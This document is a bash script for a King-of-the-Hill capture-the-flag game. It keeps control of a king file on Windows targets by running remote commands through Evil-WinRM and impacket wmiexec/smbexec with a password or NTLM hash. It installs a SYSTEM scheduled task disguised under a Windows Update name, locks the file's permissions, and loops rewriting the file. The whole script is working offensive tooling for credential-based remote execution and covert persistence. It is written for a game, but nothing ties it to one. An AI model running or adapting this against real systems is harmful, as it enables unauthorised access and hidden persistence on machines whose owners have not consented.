#!/usr/bin/env bash
# koth-windows-hold.sh — Windows KotH flag hold daemon
#
# Maintains king file hold on a Windows KotH target using scheduled task
# persistence + active remote write loop. Falls back through connection
# methods automatically (Evil-WinRM → wmiexec → smbexec).
#
# Usage:
#   koth-windows-hold.sh --target 10.10.10.10 --user Administrator --pass Password1
#   koth-windows-hold.sh --target 10.10.10.10 --user Administrator --hash NTLM_HASH
#   koth-windows-hold.sh --target 10.10.10.10 --user admin --pass pass --name ${OPERATOR_NAME:-operator} --interval 2
#   koth-windows-hold.sh --target 10.10.10.10 --user admin --pass pass --no-schtask
#   koth-windows-hold.sh --target 10.10.10.10 --user admin --pass pass --check

set -euo pipefail

CTF_ROOT="${CTF_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
ARTIFACTS="$CTF_ROOT/artifacts/windows"
TOOLS_WIN="$CTF_ROOT/tools/windows"

TARGET=""
USER=""
PASS=""
HASH=""
DOMAIN="."
NAME="${OPERATOR_NAME:-operator}"
INTERVAL=2
NO_SCHTASK=false
CHECK_ONLY=false
KING_FILE="C:\\king.txt"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --target|-t)    TARGET="$2";    shift 2 ;;
    --user|-u)      USER="$2";      shift 2 ;;
    --pass|-p)      PASS="$2";      shift 2 ;;
    --hash)         HASH="$2";      shift 2 ;;
    --domain|-d)    DOMAIN="$2";    shift 2 ;;
    --name|-n)      NAME="$2";      shift 2 ;;
    --interval|-I)  INTERVAL="$2";  shift 2 ;;
    --king-file)    KING_FILE="$2"; shift 2 ;;
    --no-schtask)   NO_SCHTASK=true; shift ;;
    --check)        CHECK_ONLY=true; shift ;;
    -h|--help) grep '^#' "$0" | head -15 | sed 's/^# \?//'; exit 0 ;;
    *) echo "[!] Unknown flag: $1"; exit 1 ;;
  esac
done

[[ -z "$TARGET" ]] && { echo "[!] --target required"; exit 1; }
[[ -z "$USER"   ]] && { echo "[!] --user required"; exit 1; }
[[ -z "$PASS" && -z "$HASH" ]] && { echo "[!] --pass or --hash required"; exit 1; }

OUT="$ARTIFACTS/$TARGET"
mkdir -p "$OUT"
TS=$(date +%Y%m%d_%H%M%S)
LOG="$OUT/koth_hold_$TS.log"

ts()   { date +%H:%M:%S; }
log()  { echo "[$(ts)] $*" | tee -a "$LOG"; }
ok()   { echo "[$(ts)] [+] $*" | tee -a "$LOG"; }
warn() { echo "[$(ts)] [!] $*" | tee -a "$LOG"; }
fail() { echo "[$(ts)] [FAIL] $*" | tee -a "$LOG"; }

log "Target:   $TARGET"
log "User:     $USER ($DOMAIN)"
log "Name:     $NAME"
log "Interval: ${INTERVAL}s"
log "King:     $KING_FILE"

# ── Remote execution wrapper ──────────────────────────────────────────────────
CONN_METHOD=""

try_exec() {
  local cmd="$1"
  local method="${CONN_METHOD:-}"

  # Try Evil-WinRM first (cleanest output)
  if [[ -z "$method" || "$method" == "winrm" ]]; then
    if command -v evil-winrm &>/dev/null; then
      if [[ -n "$PASS" ]]; then
        result=$(evil-winrm -i "$TARGET" -u "$USER" -p "$PASS" \
          -c "$cmd" 2>/dev/null | tail -n +3 | head -5 || echo "FAIL")
      else
        result=$(evil-winrm -i "$TARGET" -u "$USER" -H "$HASH" \
          -c "$cmd" 2>/dev/null | tail -n +3 | head -5 || echo "FAIL")
      fi
      if [[ "$result" != "FAIL" && -n "$result" ]]; then
        CONN_METHOD="winrm"
        echo "$result"
        return 0
      fi
    fi
  fi

  # Try wmiexec (fileless)
  if [[ -z "$method" || "$method" == "wmiexec" ]]; then
    if command -v impacket-wmiexec &>/dev/null; then
      if [[ -n "$PASS" ]]; then
        result=$(impacket-wmiexec "$DOMAIN/$USER:$PASS@$TARGET" \
          "cmd /c $cmd" 2>/dev/null | grep -v "^Impacket\|^\[\*\]\|^$" | head -5 || echo "FAIL")
      else
        result=$(impacket-wmiexec -hashes ":$HASH" "$DOMAIN/$USER@$TARGET" \
          "cmd /c $cmd" 2>/dev/null | grep -v "^Impacket\|^\[\*\]\|^$" | head -5 || echo "FAIL")
      fi
      if [[ "$result" != "FAIL" && -n "$result" ]]; then
        CONN_METHOD="wmiexec"
        echo "$result"
        return 0
      fi
    fi
  fi

  # Try smbexec fallback
  if [[ -z "$method" || "$method" == "smbexec" ]]; then
    if command -v impacket-smbexec &>/dev/null; then
      if [[ -n "$PASS" ]]; then
        result=$(impacket-smbexec "$DOMAIN/$USER:$PASS@$TARGET" \
          "cmd /c $cmd" 2>/dev/null | grep -v "^Impacket\|^\[\*\]\|^$" | head -5 || echo "FAIL")
      else
        result=$(impacket-smbexec -hashes ":$HASH" "$DOMAIN/$USER@$TARGET" \
          "cmd /c $cmd" 2>/dev/null | grep -v "^Impacket\|^\[\*\]\|^$" | head -5 || echo "FAIL")
      fi
      if [[ "$result" != "FAIL" && -n "$result" ]]; then
        CONN_METHOD="smbexec"
        echo "$result"
        return 0
      fi
    fi
  fi

  fail "All connection methods failed for: $cmd"
  return 1
}

# Silent exec — used in hold loop (suppresses output)
silent_exec() {
  local cmd="$1"
  if [[ "$CONN_METHOD" == "winrm" ]] && command -v evil-winrm &>/dev/null; then
    if [[ -n "$PASS" ]]; then
      evil-winrm -i "$TARGET" -u "$USER" -p "$PASS" \
        -c "$cmd" &>/dev/null || return 1
    else
      evil-winrm -i "$TARGET" -u "$USER" -H "$HASH" \
        -c "$cmd" &>/dev/null || return 1
    fi
  elif command -v impacket-wmiexec &>/dev/null; then
    if [[ -n "$PASS" ]]; then
      impacket-wmiexec -nooutput "$DOMAIN/$USER:$PASS@$TARGET" \
        "cmd /c $cmd" &>/dev/null || return 1
    else
      impacket-wmiexec -nooutput -hashes ":$HASH" "$DOMAIN/$USER@$TARGET" \
        "cmd /c $cmd" &>/dev/null || return 1
    fi
  fi
}

# Write king file
write_king() {
  silent_exec "echo $NAME > $KING_FILE" 2>/dev/null || return 1
}

# Read king file content
read_king() {
  try_exec "type $KING_FILE" 2>/dev/null | tr -d '\r\n ' || echo ""
}

# ── CHECK mode ────────────────────────────────────────────────────────────────
if $CHECK_ONLY; then
  log "Check mode — testing connectivity and king file..."
  current=$(try_exec "whoami" 2>/dev/null | head -1 || echo "FAILED")
  king=$(try_exec "type $KING_FILE 2>nul" 2>/dev/null | head -1 || echo "NOT FOUND")
  log "Connection: $CONN_METHOD → $current"
  log "King file:  $king"
  schtask=$(try_exec 'schtasks /query /tn "Microsoft\Windows\WindowsUpdate\Sync" 2>nul' 2>/dev/null | head -3 || echo "NOT INSTALLED")
  log "Schtask:    $schtask"
  exit 0
fi

# ── Test connectivity ─────────────────────────────────────────────────────────
log "Testing connectivity..."
whoami_result=$(try_exec "whoami" 2>/dev/null | head -1 || echo "FAILED")
if [[ "$whoami_result" == "FAILED" || -z "$whoami_result" ]]; then
  fail "Cannot connect to $TARGET — check credentials and target."
  exit 1
fi
ok "Connected as: $whoami_result (method: $CONN_METHOD)"

# ── Find king file ────────────────────────────────────────────────────────────
log "Locating king file..."
KING_CANDIDATES=(
  'C:\\king.txt'
  'C:\\Users\\king.txt'
  'C:\\Users\\Administrator\\king.txt'
  'C:\\Users\\Public\\king.txt'
  'C:\\Windows\\Temp\\king.txt'
)

if try_exec "type $KING_FILE 2>nul" &>/dev/null; then
  ok "King file confirmed: $KING_FILE"
else
  for candidate in "${KING_CANDIDATES[@]}"; do
    result=$(try_exec "dir $candidate 2>nul" 2>/dev/null | head -1 || echo "")
    if [[ -n "$result" && "$result" != *"cannot find"* ]]; then
      KING_FILE="$candidate"
      ok "King file found: $KING_FILE"
      break
    fi
  done
  if [[ "$KING_FILE" == 'C:\\king.txt' ]]; then
    warn "King file not found at common paths — using default: $KING_FILE"
    warn "Write will create it if possible."
  fi
fi

# ── Initial king write ────────────────────────────────────────────────────────
log "Writing king file..."
write_king && ok "King file written: $NAME → $KING_FILE" || warn "Initial write failed"

# ── Install scheduled task persistence ───────────────────────────────────────
TASK_NAME="Microsoft\\Windows\\WindowsUpdate\\Sync"
TASK_CMD="cmd /c echo $NAME > $KING_FILE"

if ! $NO_SCHTASK; then
  log "Installing scheduled task persistence..."
  install_result=$(try_exec \
    "schtasks /create /sc MINUTE /mo 1 /tn \"$TASK_NAME\" /tr \"$TASK_CMD\" /ru SYSTEM /f 2>nul" \
    2>/dev/null | head -2 || echo "")

  if echo "$install_result" | grep -qi "SUCCESS\|created\|updated"; then
    ok "Scheduled task installed: $TASK_NAME (runs every 1 min as SYSTEM)"
  else
    warn "Scheduled task install may have failed — running active loop only"
    warn "Result: $install_result"
  fi

  # Verify
  task_status=$(try_exec \
    "schtasks /query /tn \"$TASK_NAME\" /fo LIST 2>nul" \
    2>/dev/null | grep -i "Status\|Next Run" | head -2 || echo "")
  [[ -n "$task_status" ]] && log "Task status: $task_status"
fi

# ── ACL lock on king file ─────────────────────────────────────────────────────
log "Locking king file ACL..."
silent_exec "icacls $KING_FILE /inheritance:r /grant:r \"NT AUTHORITY\\SYSTEM:F\" 2>nul" || \
  warn "ACL lock failed — file may be contested"

# ── Active hold loop ──────────────────────────────────────────────────────────
log "Starting active hold loop (interval: ${INTERVAL}s, Ctrl+C to stop)..."
log "Scheduled task continues holding even if this loop stops."
echo ""

LOOP_COUNT=0
LOSS_COUNT=0
LAST_LOSS=0

trap 'log "Hold loop interrupted. Scheduled task continues on target."; exit 0' INT TERM

while true; do
  LOOP_COUNT=$((LOOP_COUNT + 1))

  # Write king file
  if write_king 2>/dev/null; then
    # Verify
    current=$(read_king 2>/dev/null | head -1 || echo "")
    if [[ "$current" == "$NAME"* || "$current" == *"$NAME"* ]]; then
      if [[ $((LOOP_COUNT % 30)) -eq 0 ]]; then
        ok "Hold confirmed: $current (loop: $LOOP_COUNT, losses: $LOSS_COUNT)"
      fi
    else
      LOSS_COUNT=$((LOSS_COUNT + 1))
      LAST_LOSS=$LOOP_COUNT
      warn "LOSS DETECTED — king=$current — burst reclaiming..."

      # Write burst on loss
      for i in {1..5}; do
        write_king 2>/dev/null &
      done
      wait

      # Re-verify after burst
      sleep 0.5
      current_after=$(read_king 2>/dev/null | head -1 || echo "unknown")
      if [[ "$current_after" == "$NAME"* ]]; then
        ok "RECLAIMED after burst — $NAME"
      else
        warn "Burst did not reclaim — opponent hold is strong: $current_after"
        # Re-install scheduled task
        if ! $NO_SCHTASK; then
          log "Re-installing scheduled task..."
          try_exec "schtasks /create /sc MINUTE /mo 1 /tn \"$TASK_NAME\" /tr \"$TASK_CMD\" /ru SYSTEM /f 2>nul" \
            &>/dev/null || true
        fi
      fi
    fi
  else
    warn "Write failed (connection issue?) — attempting reconnect..."
    # Force method re-detection on next iteration
    CONN_METHOD=""
    sleep 3
  fi

  sleep "$INTERVAL"
done
